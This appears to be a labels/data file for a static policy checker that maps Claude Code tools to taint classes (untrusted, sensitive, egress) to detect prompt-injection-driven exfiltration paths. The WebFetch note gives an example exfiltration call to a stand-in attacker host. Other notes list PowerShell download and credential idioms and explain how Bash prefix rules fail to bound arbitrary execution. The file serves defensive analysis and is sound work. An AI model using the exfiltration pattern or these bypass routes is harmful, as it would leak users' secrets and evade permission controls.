//: The labeler — the human-authored map from a Claude Code tool (or permission rule) to abstract effect classes. This file is DATA, not code, so it is inspectable and overridable (--labels <file>). It is a NAMED TRUST OBLIGATION, not a proved thing: polycheck proves the POLICY over these labels; it does not prove the labels are right. A mislabeled tool is a hole the proof cannot see. Effects are the taint universe {untrusted, sensitive, egress}; add your own and reference them in regions.

effects.untrusted: the session now holds content of external / attacker-influenceable provenance (prompt-injection carrier)
effects.sensitive: the session has read secret material — credentials, keys, tokens, private data
effects.egress: the session holds an outbound channel capable of carrying bytes off the machine

WebFetch.note: BOTH ingest and egress. It pulls attacker-controlled content INTO context AND can carry data OUT in the URL/query — WebFetch('https://attacker.example/?k=' + secret) is the classic, in-the-wild exfiltration channel (Check Point: token exfiltration via Claude Code). Labeling it ingest-only was a real bug: it left an ungated egress path whenever only Bash(curl) was gated.

WebSearch.note: returns external content into the context. A search QUERY is technically a low-bandwidth egress channel (searching for a secret string sends it to the provider); left as ingest-only here to avoid over-flagging, but noted rather than hidden.

Read.note: benign unless it can reach a secret path — see sensitivePaths; an unrestricted Read is treated as sensitive-capable

Edit.note: local mutation; out of scope for the exfiltration regions (a tampering region would cover it — v1 does not model integrity)

Glob.note: path enumeration; discloses names, not contents

Grep.note: can read secret file contents if pointed at them; treated like Read for the sensitive class

Bash.note: effect depends on the command string; see bashPatterns. An unrestricted Bash (no specifier, '*', or ':*') is gated on DECLARED WORST-CASE — it alone can complete the trifecta.

Task.note: spawns a subagent — a delegation edge. v1 does NOT propagate taint across the spawn (a known gap in v1). Reported loudly, not silently cleared.

PowerShell.note: a general-purpose shell like Bash: an unrestricted grant runs arbitrary code (shell-equivalent), and specific commands are matched by the bash pattern lists — which include PowerShell idioms (Invoke-WebRequest/iwr, Invoke-RestMethod/irm, Get-Credential, iex, Start-Process).

pwsh.note: PowerShell Core — same treatment as PowerShell.

mcp.note: An MCP tool's real effects are unknowable at static time (the server is not run). Two honest defaults. (1) Every MCP tool returns remote, attacker-influenceable bytes into context, so it is 'untrusted'. (2) MCP tools usually act on EXTERNAL systems (Slack, GitHub, Notion, Linear…), so a tool whose name matches an egress verb (send/post/create/write/upload/…) is ALSO 'egress' — a first-class exfiltration channel exactly like WebFetch. A whole server whose tool list we cannot see (mcp__server__*) is worst-case untrusted+egress. This is a heuristic and a named trust obligation: override per tool in 'tools' by full name (mcp__server__tool), and every assumption is surfaced in the report.

//bashArbitraryExecution: Commands whose prefix is NOT a security boundary: they run caller-chosen code, so bounding them by a Bash(prefix:*) rule proves nothing. `npm run test` executes whatever package.json says (and prefix-matches `npm run test:whatever`); `make`, `python`, `bash -c`, `xargs`, `find -exec`, `git -c core.pager=…` all execute arbitrary code. Any match here is declared WORST-CASE (untrusted ∧ sensitive ∧ egress) — the single largest source of false-PROOF if omitted.
//defaultUngated: Built-in read-only tools Claude Code runs WITHOUT a prompt even with an empty policy. They are ungated allow-edges by default (version-dependent; override with --labels). This is why an empty policy is not automatically safe: Read alone supplies the 'sensitive' effect. Surfaced as an assumption in every report.
